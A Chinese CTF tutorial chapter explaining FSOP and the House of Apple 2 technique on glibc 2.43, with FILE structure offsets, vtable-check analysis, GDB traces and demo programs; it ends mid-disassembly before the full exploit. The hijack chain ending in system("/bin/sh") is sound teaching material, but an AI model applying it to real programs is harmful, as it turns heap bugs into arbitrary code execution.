---
chapter: PWN
section: 现代 glibc 对抗：FSOP 与 House of Apple 2
order: 316
tags:
  - CTF
  - PWN
  - 堆
publish: true
---

# P16 FSOP 与 House of Apple 2
## FSOP & House of Apple 2

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L3 堆上利用期 ｜ **前置要求**：[[P12-glibc堆管理机制|P12]] · [[P14-tcache与fastbin利用|P14]] · [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]
> **本章目标**：接住 [[P14-tcache与fastbin利用|P14]] 递过来的"任意地址分配"——在 hook 已被移除的 glibc 2.34+ 上，把它变成 getshell 的最后一步。读懂 `_IO_FILE` 结构与文件结构链，看清 vtable 校验的边界，然后用 House of Apple 2 借一张合法跳表完成从任意写到 `system("/bin/sh")` 的完整利用。本章全部内容按 glibc 2.43 的行为讲解，压轴是从任意写一路走到 getshell 的完整 exploit。

## 1. Hook 退场之后：缺的那个"执行落点"

[[P12-glibc堆管理机制|P12]]第 9 节的对照表里有一行：`__malloc_hook` / `__free_hook` 自 glibc 2.34 起不再被 malloc/free 读取。对老题解来说这意味着一条整条路线的消失——过去拿到一次任意写，把它写到 `__free_hook` 上，下一次 free 就执行你的函数，==任意写直接兑换成控制流==。本节把这组 hook 在 2.43 上的真实状态看清楚，再回答由此产生的问题：任意写之后，还能去哪。

### 1.1 符号还在，但已经是"兼容壳"

在动态符号表里搜一下这三个名字：

```bash
nm -D /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E '__malloc_hook|__free_hook|__realloc_hook'
```

输出：

```
0000000000219188 V __free_hook@GLIBC_2.2.5
0000000000219180 V __malloc_hook@GLIBC_2.2.5
0000000000219178 V __realloc_hook@GLIBC_2.2.5
```

三个符号都在——和不少资料宣称的"符号已被移除"不一样。但注意后缀是**单 `@`**：[[P03-ELF链接与延迟绑定#7. 常见问题|P3]]的 readelf 输出里，正常导出的符号挂着的是默认版本（`puts@@GLIBC_2.2.5`，双 `@`）；单 `@` 是**兼容版本定义**——它只为"按老版本号引用它的旧二进制"保留，新代码绑定不到它。两层证据：

新程序想引用它，链接期直接失败：

```bash
gcc -O0 -fno-pie -no-pie -g hook_test.c -o hook_test -ldl
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccfZi8gV.o: in function `main':
hook_test.c:(.text+0x1d): undefined reference to `__free_hook'
collect2: error: ld returned 1 exit status
```

绕过链接器、用 `dlsym` 在运行期解析，拿到的是空指针，写进去的东西也没人读：

```c
/* hook_test.c —— __free_hook 在 2.43 上还是否生效（x86-64 Linux） */
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int main(void) {
    void **hook = (void **)dlsym(RTLD_DEFAULT, "__free_hook");
    printf("__free_hook resolved to %p\n", (void *)hook);
    if (hook != NULL) {
        *hook = (void *)puts;    /* 若 hook 仍被读，free 时会调 puts(p) */
    }
    void *p = malloc(0x18);
    free(p);
    puts("free returned normally; hook ignored");
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -g hook_test.c -o hook_test -ldl
./hook_test
```

输出：

```
__free_hook resolved to (nil)
free returned normally; hook ignored
```

> [!warning] 结论：hook 这条路在 2.43 上整体不可用
> 链接绑不上、运行期解析不到、实现不再读——三层都封死。读老题解看到"把 `system` 写进 `__free_hook`"的步骤，在本机环境下==没有对应物==，需要换成第 4 节起的 stdio 路线。老二进制（2.34 之前编译、按 GLIBC_2.2.5 版本引用这些符号的）装载时仍能解析到兼容定义，那是给它们保留的 ABI 义务，与利用无关。

### 1.2 任意分配之后，去哪找执行落点

[[P14-tcache与fastbin利用|P14]]讲完 tcache poisoning：改掉空闲块的 next 指针，malloc 就会把任意地址"分配"出来，接下来 edit 什么、哪里就写上什么——==任意写到手==。但任意写不等于任意执行，还差一个"写完之后程序替你调用它"的落点。把候选落点排一遍：

| 落点 | 现状 |
| ---- | ---- |
| GOT 表项 | Full RELRO 下整张表只读（[[P03-ELF链接与延迟绑定#3. RELRO：GOT 什么时候变只读\|P3 第 3 节]]），Partial RELRO 的题才轮得到它 |
| `__malloc_hook` 一族 | 2.34 起不再被读，1.1 的三层封死 |
| exit 处理链 | `__exit_funcs` 里的函数指针经过加密（指针与 TLS 里的随机值异或再循环移位），不知道密钥就伪造不出合法表项 |
| **stdio 的 FILE 结构链** | `_IO_list_all` / `_chain` 是普通指针，无加密无签名；退出时标准库按字段解释这些结构并经跳表调用——==本章的主着陆点== |

stdio 这条路线统称 **FSOP**（File Stream Oriented Programming）：把标准库的文件结构当成攻击面，伪造或篡改一个 FILE 结构，让标准库在正常流程里"替你调用"它。为什么这条路至今活着：文件结构链是==数据驱动的==——遍历它的是数据指针，调用它的是结构体里的跳表指针，两者都没有加密或签名，只有一道"跳表地址必须落在指定区间"的区间判断，而区间内恰好躺着几张可以借用的合法跳表。本章 2、3 节把这套数据结构看透，4 节讲触发，5 节完成完整利用。

> [!info]- 其他幸存落点的归属
> 2.34 之后还能当执行落点的地方不止 stdio：ld.so 的动态链接器数据里有若干函数指针（`_rtld_global` 的锁回调一族），对应 House of Banana、House of Cat 一类打法；`_IO_14_cleanup` 之外还有 `atexit` 结构配合指针加密的变体。这些的入手点同样"写一个结构体"，但结构落在 ld.so 侧，字段约束与本章不同，[[P15-House系列攻击技术|P15]] 汇总对照。先把 FILE 这条最通用的走通。

## 2. _IO_FILE：标准库的文件结构

`fopen` 返回的 `FILE *`、`stdin`/`stdout`/`stderr` 背后，都是同一个结构 `struct _IO_FILE`（内部名 `_IO_FILE_plus`——公开头文件的 `struct _IO_FILE` 之外还挂着一个 vtable 指针）。本节先看三个流与链的组织，再逐字段过一遍偏移表，最后用 GDB 把它们看在眼里。

### 2.1 三个流、三个静态结构与一条链

程序启动时，libc 里已经躺着三个现成的 FILE 结构：`_IO_2_1_stdin_`、`_IO_2_1_stdout_`、`_IO_2_1_stderr_`；[[P03-ELF链接与延迟绑定#4. ret2plt：把 libc 地址打印出来|P3 第 4 节]]讲过的全局变量 `stdin`/`stdout`/`stderr` 是三个指针，分别指向它们。把这些结构串成一条链的是另一个全局指针 **`_IO_list_all`**：它指向链头，每个结构的 `_chain` 字段（偏移 0x68）指向下一个，链尾是 NULL。刷新缓冲、退出清理都靠遍历这条链进行。

链上到底是什么顺序，用 GDB 看一遍。观察脚本与 [[P12-glibc堆管理机制#7. 调试方法：GDB 原生加自写堆观察脚本|P12 第 7 节]]同款写法（GDB 原生命令，不装插件；GDB 本身的使用见 [[R06-动态调试GDB与x64dbg|R06]]）：

```text
# gdb_file.cmds —— 观察 FILE 结构、_IO_list_all 与 _chain
# 跑法：gdb -q -batch -x gdb_file.cmds ./p16_note
set pagination off
set confirm off
break main
run
printf "== 三个标准流与链头 ==\n"
p/x (unsigned long)&_IO_2_1_stdout_
p/x *(unsigned long *)&stdout
p/x *(unsigned long *)&_IO_list_all
set $list = *(unsigned long *)&_IO_list_all
printf "== _chain 链遍历 ==\n"
p (struct _IO_FILE *)$list
p ((struct _IO_FILE *)$list)->_chain
p ((struct _IO_FILE *)$list)->_chain->_chain
p ((struct _IO_FILE *)$list)->_chain->_chain->_chain
printf "== vtable 定位（结构体定义之外的第 0xd8 字节） ==\n"
set $so = (unsigned long)&_IO_2_1_stdout_
x/gx $so+0xd8
info symbol *(unsigned long *)($so+0xd8)
printf "== _IO_list_all 邻居 ==\n"
x/4gx &_IO_list_all
p/x $list & 0xf
quit
```

`_IO_2_1_stdout_` 这类符号在 libc 的动态符号表里没有类型信息，GDB 打印内容时要==按类型强转==（`p *(struct _IO_FILE *)&_IO_2_1_stdout_`）；取地址（`&_IO_2_1_stdout_`）不需要。运行：

```bash
gdb -q -batch -x gdb_file.cmds ./p16_note
```

输出：

```
== 三个标准流与链头 ==
$1 = 0x7ffff7e13580
$2 = 0x7ffff7e13580
$3 = 0x7ffff7e134a0
== _chain 链遍历 ==
$4 = (struct _IO_FILE *) 0x7ffff7e134a0 <_IO_2_1_stderr_>
$5 = (struct _IO_FILE *) 0x7ffff7e13580 <_IO_2_1_stdout_>
$6 = (struct _IO_FILE *) 0x7ffff7e128e0 <_IO_2_1_stdin_>
$7 = (struct _IO_FILE *) 0x0
== vtable 定位（结构体定义之外的第 0xd8 字节） ==
0x7ffff7e13658 <_IO_2_1_stdout_+216>:	0x00007ffff7e11030
_IO_file_jumps in section .data.rel.ro of /usr/lib/x86_64-linux-gnu/libc.so.6
== _IO_list_all 邻居 ==
0x7ffff7e13480 <_IO_list_all>:	0x00007ffff7e134a0	0x0000000000000000
0x7ffff7e13490:	0x0000000000000000	0x0000000000000000
$9 = 0x0
```

四件事一次看清：

- **`stdout` 与 `_IO_2_1_stdout_` 的关系**：`$1` 与 `$2` 相等——全局变量 `stdout` 里存的就是 `_IO_2_1_stdout_` 的地址。程序里写 `stdout`，摸到的就是这个静态结构。
- **链的初始顺序**：`$4` 到 `$7`——`_IO_list_all` → `_IO_2_1_stderr_` → `_IO_2_1_stdout_` → `_IO_2_1_stdin_` → NULL。==stderr 排在链头==，遍历是从它开始的。
- **vtable 指针的位置**：`_IO_2_1_stdout_+216`（216 即 0xd8）里存着 `_IO_file_jumps`——stdout 默认的跳表。它在 libc 的 `.data.rel.ro` 段里（第 3 节的主角）。
- **`_IO_list_all` 的对齐与邻居**：低 4 位为 0（16 字节对齐，这个性质第 5 节的 tcache poisoning 会用到）；它后面紧邻的 0x18 字节本来全是 0。

### 2.2 字段逐讲：64 位偏移表

结构定义来自公开头文件，编译期就能把每个字段的偏移问出来：

```c
/* off.c —— 打印 struct _IO_FILE 各字段的 64 位偏移（x86-64 Linux） */
#include <stdio.h>
#include <stddef.h>

#define P(f) printf("%-16s +%#lx\n", #f, offsetof(FILE, f))

int main(void) {
    P(_flags);
    P(_IO_read_ptr);
    P(_IO_read_end);
    P(_IO_read_base);
    P(_IO_write_base);
    P(_IO_write_ptr);
    P(_IO_write_end);
    P(_IO_buf_base);
    P(_IO_buf_end);
    P(_IO_save_base);
    P(_IO_backup_base);
    P(_IO_save_end);
    P(_markers);
    P(_chain);
    P(_fileno);
    P(_old_offset);
    P(_cur_column);
    P(_vtable_offset);
    P(_shortbuf);
    P(_lock);
    P(_offset);
    P(_codecvt);
    P(_wide_data);
    P(_freeres_list);
    P(_freeres_buf);
    P(_mode);
    P(_unused2);
    printf("%-16s %#lx\n", "sizeof(FILE)", sizeof(FILE));
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -g off.c -o off && ./off
```

输出：

```
_flags           +0
_IO_read_ptr     +0x8
_IO_read_end     +0x10
_IO_read_base    +0x18
_IO_write_base   +0x20
_IO_write_ptr    +0x28
_IO_write_end    +0x30
_IO_buf_base     +0x38
_IO_buf_end      +0x40
_IO_save_base    +0x48
_IO_backup_base  +0x50
_IO_save_end     +0x58
_markers         +0x60
_chain           +0x68
_fileno          +0x70
_old_offset      +0x78
_cur_column      +0x80
_vtable_offset   +0x82
_shortbuf        +0x83
_lock            +0x88
_offset          +0x90
_codecvt         +0x98
_wide_data       +0xa0
_freeres_list    +0xa8
_freeres_buf     +0xb0
_mode            +0xc0
_unused2         +0xd0
sizeof(FILE)     0xd8
```

`sizeof` 是 0xd8，而 vtable 指针在 +0xd8——==它不在公开头文件的结构定义里==，是内部版本追加在末尾的最后一个字段，所以这张表里查不到它，定位方法就是 2.1 的 `x/gx 结构地址+0xd8`。利用视角下值得逐个说清的字段：

- **`_flags`（+0x00）**：一组位标志，一个 32 位整数。低位的几个标志会被读写路径检查：`_IO_UNBUFFERED`（0x2，无缓冲）、`_IO_NO_WRITES`（0x8，只读流）、`_IO_CURRENTLY_PUTTING`（0x800，正在写）、`_IO_USER_LOCK`（0x8000，跳过加锁）。伪造 FILE 时这 8 个字节既要避开有害标志，==又要兼作别用==——第 5 节它会变成一条命令字符串的开头。
- **读写指针族（+0x08 至 +0x40）**：`_IO_read_ptr/end/base` 描述"读"的进度，`_IO_write_base/ptr/end` 描述"写"的缓冲区——`write_base` 是缓冲区起点，`write_ptr` 指向已写入数据的末尾。==`_IO_write_ptr > _IO_write_base` 就是"有未写出的数据"==，刷新函数据此决定要不要处理这个流，这是 FSOP 的触发条件本身。
- **`_chain`（+0x68）**：链向下一个 FILE，2.1 的链就靠它串起来。伪造结构时它决定"遍历到我为止还是继续往后"。
- **`_fileno`（+0x70）**：文件描述符编号，stdout 是 1。部分刷新路径会检查它非负。
- **`_lock`（+0x88）**：指向一把 16 字节的锁。标准库遍历链、逐个处理流之前会对每个结构加锁解锁，==加锁动作就是对这 16 字节的读写==——它必须指向一段**可写的、可安全清零的内存**，指到 NULL 或只读页上，遍历还没到调用那一步就先段错误。

> [!warning] `_lock` 是伪造 FILE 的第一个坑
> 大量第一次做 FSOP 的 payload 死在调用之前：vtable、字段都摆好了，程序却在加锁那条指令上崩掉——`_lock` 是 NULL。摆一个堆上已知的清零区域（自己 chunk 的高偏移处就行），或者借 libc 里某个闲置的可写数据地址。

- **`_wide_data`（+0xa0）**：指向宽字符模式（`wchar_t`）专用的伴生结构 `_IO_wide_data`。流切到宽字符模式时，读写进度、缓冲区都记在它里面，末尾还挂着自己的跳表指针（`_wide_vtable`）。==House of Apple 2 的关键调用链就落在这个伴生结构上==，第 5 节展开。
- **`_mode`（+0xc0）**：0 = 字节模式，大于 0 = 宽字符模式。刷新函数按它的正负选择检查哪一套读写指针——伪造时通常写 0，走最简单的一支。

> [!info]- 其余字段的角色
> `_IO_buf_base`/`_IO_buf_end` 是缓冲区本体（`setbuf`/`setvbuf` 管的就是它们）；`_IO_save_base` 一族与 `_markers` 服务于 ftell/fseek 的备份与回退；`_old_offset`/`_offset` 记文件偏移；`_codecvt` 是字节与宽字符之间的转换状态；`_freeres_list`/`_freeres_buf` 供退出时回收缓冲。伪造结构时保持它们为 0，上述主路径不会触碰。

### 2.3 用 GDB 看一个真实 FILE

把 2.1 脚本里的类型强转用起来，直接打印 stdout 的全部字段：

```text
# 在 gdb_file.cmds 的基础上追加
p *(struct _IO_FILE *)&_IO_2_1_stdout_
```

输出：

```
$8 = {_flags = -72540028, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7e128e0 <_IO_2_1_stdin_>, _fileno = 1, _flags2 = 0, _short_backupbuf = "", _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "", _lock = 0x7ffff7e14750 <_IO_stdfile_1_lock>, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7e127e0 <_IO_wide_data_1>, _freeres_list = 0x0, _freeres_buf = 0x0, _prevchain = 0x7ffff7e13508 <_IO_2_1_stderr_+104>, _mode = 0, _unused3 = 0, _total_written = 0, _unused2 = "\000\000\000\000\000\000\000"}
```

逐项对上 2.2 的表：`_chain` 指向 stdin（链的顺序），`_fileno` 是 1，`_lock` 指向 libc 里专用的锁变量 `_IO_stdfile_1_lock`（真实程序里 `_lock` 的标准长相），`_wide_data` 指向 `_IO_wide_data_1`，`_mode` 是 0。一处需要说明的差异：这行输出里的 `_short_backupbuf`、`_prevchain`、`_total_written` 等名字来自 libc 自带的内部类型描述，==公开头文件的 `struct _IO_FILE` 里没有它们==，中间几个字段的名字两边对不上；==利用要用的偏移（chain 0x68、lock 0x88、wide_data 0xa0、mode 0xc0）两边完全一致==，做题时以 2.2 的偏移表为准。

## 3. vtable 与它的区间校验

### 3.1 跳表：函数指针的一张表

每个 FILE 末尾（+0xd8）的 vtable 指针指向一张**跳表**（类型 `struct _IO_jump_t`）：把"这个流该用什么实现去读、写、定位"的 21 个函数指针排成一张定长的表。标准库对流的每个操作都是一次查表调用——`fputs` 落到 `__xsputn` 槽位，退出刷新落到 `__overflow` 槽位。各槽位的偏移：

| 偏移 | 槽位 | 偏移 | 槽位 |
| ---- | ---- | ---- | ---- |
| 0x00 | `__dummy` | 0x50 | `__seekpos` |
| 0x08 | `__dummy2` | 0x58 | `__setbuf` |
| 0x10 | `__finish` | 0x60 | `__sync` |
| 0x18 | `__overflow` | 0x68 | `__doallocate` |
| 0x20 | `__underflow` | 0x70 | `__read` |
| 0x28 | `__uflow` | 0x78 | `__write` |
| 0x30 | `__pbackfail` | 0x80 | `__seek` |
| 0x38 | `__xsputn` | 0x88 | `__close` |
| 0x40 | `__xsgetn` | 0x90 | `__stat` |
| 0x48 | `__seekoff` | 0x98 | `__showmanyc` |
|      |              | 0xa0 | `__imbue` |

表里的名字与 `__overflow` 在 +0x18、`__doallocate` 在 +0x68 这两个位置，第 4、5 节都要用。用 GDB 把 `_IO_file_jumps` 的 21 个槽位与其中四个槽位解析出的函数名打出来对号：

```text
# 在 break main 之后执行
set $j = (unsigned long)&_IO_file_jumps
printf "_IO_file_jumps @ libc+0x%x\n", $j - 0x7ffff7c00000
x/21gx $j
info symbol *(unsigned long*)($j+0x10)
info symbol *(unsigned long*)($j+0x18)
info symbol *(unsigned long*)($j+0x38)
info symbol *(unsigned long*)($j+0x68)
```

输出：

```
_IO_file_jumps @ libc+0x211030
0x7ffff7e11030 <_IO_file_jumps>:	0x0000000000000000	0x0000000000000000
0x7ffff7e11040 <_IO_file_jumps+16>:	0x00007ffff7c98ea0	0x00007ffff7c9a4b0
0x7ffff7e11050 <_IO_file_jumps+32>:	0x00007ffff7c99cb0	0x00007ffff7c9d040
0x7ffff7e11060 <_IO_file_jumps+48>:	0x00007ffff7c9ea80	0x00007ffff7c9b180
0x7ffff7e11070 <_IO_file_jumps+64>:	0x00007ffff7c9b530	0x00007ffff7c9a870
0x7ffff7e11080 <_IO_file_jumps+80>:	0x00007ffff7c9d760	0x00007ffff7c99a30
0x7ffff7e11090 <_IO_file_jumps+96>:	0x00007ffff7c9a6c0	0x00007ffff7c8b980
0x7ffff7e110a0 <_IO_file_jumps+112>:	0x00007ffff7c9b040	0x00007ffff7c9b0d0
0x7ffff7e110b0 <_IO_file_jumps+128>:	0x00007ffff7c9b060	0x00007ffff7c9b0c0
0x7ffff7e110c0 <_IO_file_jumps+144>:	0x00007ffff7c9b070	0x00007ffff7c9ec70
0x7ffff7e110d0 <_IO_file_jumps+160>:	0x00007ffff7c9ec80
_IO_file_finish in section .text of /usr/lib/x86_64-linux-gnu/libc.so.6
_IO_file_overflow in section .text of /usr/lib/x86_64-linux-gnu/libc.so.6
_IO_file_xsputn in section .text of /usr/lib/x86_64-linux-gnu/libc.so.6
_IO_file_doallocate in section .text of /usr/lib/x86_64-linux-gnu/libc.so.6
```

前两个槽位是 0（`__dummy` 一族本就不放函数），+0x10 起各就各位：`_IO_file_finish`、`_IO_file_overflow`、`_IO_file_xsputn`、`_IO_file_doallocate`——与槽位表逐一对上。libc 里这样的跳表有一批：`_IO_file_jumps`（普通文件的默认实现）、`_IO_wfile_jumps`（宽字符模式）、`_IO_str_jumps`（内存串流）等，==每张都是编译期生成、躺在 libc 数据段的合法数据==。

### 3.2 校验的机制：一条区间判断

跳表指针躺在数据里，改它就等于换实现——glibc 2.28 起给这次"查表调用"加了一道校验：==调用前先确认 vtable 指针落在指定区间内，越界就终止程序==。每次经由跳表宏的调用前，内联的校验代码做这样一段算术（摘自 2.43 的 `_IO_flush_all`，`rbx` 是当前 FILE，`r13` 是编译期算好的区间起点）：

```asm
; x86-64 Linux / System V AMD64 ABI，摘自 glibc 2.43 _IO_flush_all
mov  0xd8(%rbx),%rax        ; 取 vtable 指针
mov  %rax,%rdx
sub  %r13,%rdx              ; r13 = libc+0x210ee0：合法跳表区间的起点
cmp  $0x92f,%rdx            ; 与区间长度 0x930 比较
ja   <越界处理>              ; 无符号大于 -> 走 _IO_vtable_check
mov  %rbx,%rdi
call *0x60(%rax)            ; 校验通过才查表调用
```

校验的全部内容就是==一次减法加一次比较==：vtable 指针减去区间起点，差值必须小于区间长度。区间内躺着全部合法跳表（`_IO_file_jumps` 在 libc+0x211030、`_IO_wfile_jumps` 在 libc+0x211228，都在这个区间里）。越界时进入 `_IO_vtable_check`，它调用 `__libc_fatal` 输出一行 fatal 信息后 `abort`：

```text
Fatal error: glibc detected an invalid stdio handle
```

> [!note] 2.43 的一个形状变化：独立段没了，机制没变
> 2.42 及以前的 glibc 把全部合法跳表集中放在一个独立段 `__libc_IO_vtables` 里，校验边界就是段的起止符号——老资料（以及大量题解）都这么描述。2.43 把跳表并进了 `.data.rel.ro`，`readelf -SW` 里已找不到这个段名，校验随之退化成上面那条"起点 + 长度"的立即数比较。==机制相同、说法更新==：读老资料时把"必须落在 `__libc_IO_vtables` 段内"理解为"必须落在合法跳表所在的那个区间内"即可，本题库的对照表见 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]。

### 3.3 触发一次校验失败的现场

把 stdout 的 vtable 改成一个区间外的地址（就用 stdout 自身——地址可读，但不在跳表区间里），再触发一次输出：

```c
/* vt_abort.c —— 把 stdout 的 vtable 指向一个段外地址，触发 _IO_vtable_check（x86-64 Linux） */
#include <stdio.h>

int main(void) {
    /* vtable 指针在 FILE 起始 +0xd8 处；这里指向 stdout 自身——
       地址合法可读，但不在合法跳表区间内 */
    *(void **)((char *)stdout + 0xd8) = (void *)stdout;
    fputs("hello\n", stdout);
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -g vt_abort.c -o vt_abort
./vt_abort
echo "exit code: $?"
```

输出：

```
Fatal error: glibc detected an invalid stdio handle
exit code: 134
```

`fputs` 的第一次查表调用就被拦下，134 = 128 + 6（SIGABRT）。GDB 里看回溯，能认出从校验到 abort 的整条链：

```text
# gdb_vt.cmds：set pagination off / run / bt / quit
gdb -q -batch -x gdb_vt.cmds ./vt_abort
```

输出（摘录）：

```
Program received signal SIGABRT, Aborted.
__pthread_kill_implementation (threadid=<optimized out>, signo=6, no_tid=0) at ./nptl/pthread_kill.c:44
#0  __pthread_kill_implementation (threadid=<optimized out>, signo=6, no_tid=0) at ./nptl/pthread_kill.c:44
#1  __pthread_kill_internal (threadid=<optimized out>, signo=6) at ./nptl/pthread_kill.c:89
#2  __GI___pthread_kill (threadid=<optimized out>, signo=signo@entry=6) at ./nptl/pthread_kill.c:100
#3  0x00007ffff7c45b7e in __GI_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26
#4  0x00007ffff7c288ec in __GI_abort () at ./stdlib/abort.c:77
#5  0x00007ffff7c29979 in __libc_message_impl (vma_name=vma_name@entry=0x7ffff7ddb569 "glibc: fatal", fmt=fmt@entry=0x7ffff7dde8df "%s") at ../sysdeps/posix/libc_fatal.c:138
#6  0x00007ffff7c97d80 in __libc_message_wrapper (vmaname=0x7ffff7ddb569 "glibc: fatal", fmt=0x7ffff7dde8df "%s") at ../include/stdio.h:203
#7  __GI___libc_fatal (message=message@entry=0x7ffff7de0bb0 "Fatal error: glibc detected an invalid stdio handle\n") at ../sysdeps/posix/libc_fatal.c:147
#8  0x00007ffff7c98645 in _IO_vtable_check () at ./libio/vtables.c:534
#9  _IO_vtable_check () at ./libio/vtables.c:504
#10 0x00007ffff7c8d519 in IO_validate_vtable (vtable=0x7ffff7e13580 <_IO_2_1_stdout_>) at ./libio/libioP.h:1041
#11 __GI__IO_fwrite (buf=<optimized out>, size=<optimized out>, count=<optimized out>, fp=0x7ffff7e13580 <_IO_2_1_stdout_>) at ./libio/iofwrite.c:44
#12 0x0000000000401174 in main () at vt_abort.c:8
```

#10 的 `IO_validate_vtable` 就是 3.2 那段算术的函数形态，#8 的 `_IO_vtable_check` 是越界后的去处。==校验拦的是"vtable 指针的位置"，不是"槽位里函数指针的值"==——区间内的跳表数据本身不会被逐项检查。这就是第 5 节的突破口：==不伪造区间外的跳表，而是借用区间内某张合法跳表的槽位==，让"调用链上的某一步"恰好把控制权交到我们准备好的函数指针上。

## 4. FSOP：把 FILE 变成控制流的入口

### 4.1 原理：刷新时的链遍历与查表调用

标准库保证"程序结束前把缓冲写完"，这件事由 `_IO_flush_all` 完成：从 `_IO_list_all` 出发沿 `_chain` 逐个访问 FILE，对"有未写出数据"的流调用它的 `__overflow` 槽位。用伪代码描述这次遍历（按 2.43 的行为）：

```c
for (fp = _IO_list_all; fp != NULL; fp = fp->_chain) {
    对 fp 加锁（_lock 必须可写的原因）;
    if (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
        _IO_OVERFLOW(fp, EOF);        /* 查 vtable 的 +0x18 槽位，rdi = fp */
    对 fp 解锁;
}
```

`_IO_OVERFLOW` 展开就是 3.2 的"校验 + `call *0x18`"。FSOP 的攻击形态一句话：==控制 `_IO_list_all`（或链上某个 FILE）的内容，让这次遍历落到你构造的结构上，`__overflow` 槽位（或它间接引出的函数指针）就是你指定的地址==。3.2 的校验拦住了"vtable 直接指向伪造跳表"的做法，于是在 2.28+ 的版本上，问题精确化为：

> ==如何在 vtable 只能取"区间内既有地址"的前提下，让调用链最终执行任意函数？==

### 4.2 触发路径：谁会去遍历这条链

链遍历不止一个入口，常用的是三条：

| 路径 | 到达方式 | 说明 |
| ---- | ---- | ---- |
| `exit()` | `_IO_cleanup` 调 `_IO_flush_all` | 显式调用或主函数返回都会走到，==最常用== |
| 从 main 返回 | `__libc_start_call_main` 代为调用 `exit` | 与上一条同一条路，题目不需要程序里出现 `exit` 字样 |
| `abort()` / malloc 报错 | `malloc_printerr` 一族报错后 `abort`，abort 也刷新流 | 堆被写坏时的"顺手"触发 |

第二条的完整调用路径用 GDB 下在 `_IO_flush_all` 上看（断点要等程序跑起来、libc 装载完再下，否则符号解析不到——2.1 的脚本先 `break main` 再 `run` 就是这个原因）：

```text
# gdb_flush.cmds —— 看 exit 触发 _IO_flush_all 的调用路径
# 跑法：gdb -q -batch -x gdb_flush.cmds ./p16_note（in_exit.txt 内容为菜单选项 5）
set pagination off
set confirm off
break main
run < in_exit.txt
break _IO_flush_all
continue
bt
quit
```

输出：

```
Breakpoint 1, main () at p16_note.c:29
29	    setvbuf(stdout, NULL, _IONBF, 0);
Breakpoint 2 at 0x7ffff7c9dc00: file ./libio/genops.c, line 713.
1.new 2.edit 3.show 4.free 5.exit
>
Breakpoint 2, __GI__IO_flush_all () at ./libio/genops.c:713
#0  __GI__IO_flush_all () at ./libio/genops.c:713
#1  0x00007ffff7c9e397 in _IO_cleanup () at ./libio/genops.c:883
#2  0x00007ffff7c48664 in __run_exit_handlers (status=0, listp=0x7ffff7e12680 <__exit_funcs>, run_list_atexit=run_list_atexit@entry=true, run_dtors=run_dtors@entry=true) at ./stdlib/exit.c:139
#3  0x00007ffff7c486be in __GI_exit (status=<optimized out>) at ./stdlib/exit.c:148
#4  0x00007ffff7c2a608 in __libc_start_call_main (main=main@entry=0x40133b <main>, argc=argc@entry=1, argv=argv@entry=0x7fffffffe268) at ../sysdeps/nptl/libc_start_call_main.h:83
#5  0x00007ffff7c2a718 in __libc_start_main_impl (main=0x40133b <main>, argc=1, argv=argv@entry=0x7fffffffe268, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe258) at ../csu/libc-start.c:360
#6  0x0000000000401195 in _start ()
```

`main` 返回 → `__libc_start_call_main` 调 `exit` → `__run_exit_handlers` → `_IO_cleanup` → `_IO_flush_all`——==菜单程序选"退出"就自然触达==，不依赖任何额外的代码路径。

## 5. House of Apple 2：借合法跳表拿 shell

### 5.1 思路与调用链

3.2 的结论把伪造跳表堵死了，但注意一个不对称：==校验只看 vtable 指针本身，不看跳表内容==。区间内的 `_IO_wfile_jumps` 是一张合法跳表，把伪造 FILE 的 vtable 指向它，校验通过；接下来调用的就是==这张表里的真实函数== `_IO_wfile_overflow`。它读的字段来自我们伪造的 FILE 与 `_wide_data`——控制流交给了 libc 的合法代码，数据却是我们摆的。沿着它的代码走到需要分配宽字符缓冲时，它会调用 `fp->_wide_data->_wide_vtable` 的 `__doallocate` 槽位（+0x68）——==`_wide_vtable` 这个指针在 2.43 上没有任何区间校验==，可以指向堆上伪造的跳表。完整调用链：

```text
_IO_flush_all
  └─ 条件满足 -> _IO_OVERFLOW(fp, EOF)
       └─ vtable(+0x18)：_IO_wfile_jumps->__overflow = _IO_wfile_overflow(fp, EOF)
            └─ 需要分配宽缓冲 -> _IO_wdoallocbuf(fp)
                 └─ 调 [fp->_wide_data + 0xe0] 处的 _wide_vtable 的 +0x68 槽位
                      = 任意地址的一个函数调用，rdi = fp
```

`__doallocate` 的调用约定是"第一参数 = 这个 FILE 自己"（x86-64 Linux / System V AMD64 ABI，`rdi = fp`）。这给出最后一块拼图：==`system(fp)`==——只要 fp 起始的几个字节摆成一条合法 shell 命令，`system` 一收到 fp 就会执行它。FILE 的第一个字段是 `_flags`（8 字节），把它的内容摆成 `"/bin/sh"` 加补白，==标志位和命令字符串共用同一格内存==。这条打法就是 House of Apple 2（同一作者的 House of Apple 系列之一，系列对照见 [[P15-House系列攻击技术|P15]]）。

调用链的最后一跳，直接看 2.43 里 `_IO_wdoallocbuf` 的反汇编（`rdi` 一路是 FILE 指针，`rax` 是 `_wide_data`）：

```asm
; x86-64 Linux / System V AMD64 ABI，摘自 glibc 2.43 _IO_wdoallocbuf
mov  0xa0(%rdi),%rax        ; rax = fp->_wide_data
cmpq $0x0,0x30(%rax)        ; _wide_data->_IO_buf_base == 0，否则直接返回
je   <继续>
    push %rbp
    mov  %rdi,%rdx          ; 顺带记下：rdx 也等于 fp（第 6 节用到）
    ...
testb $0x2,(%rdi)           ; _flags & _IO_UNBUFFERED，非 0 则跳过调用
jne  <不调用>
mov  0xe0(%rax),%rax        ; rax = _wide_data->_wide_vtable
mov  %rdi,-0x8(%rbp)
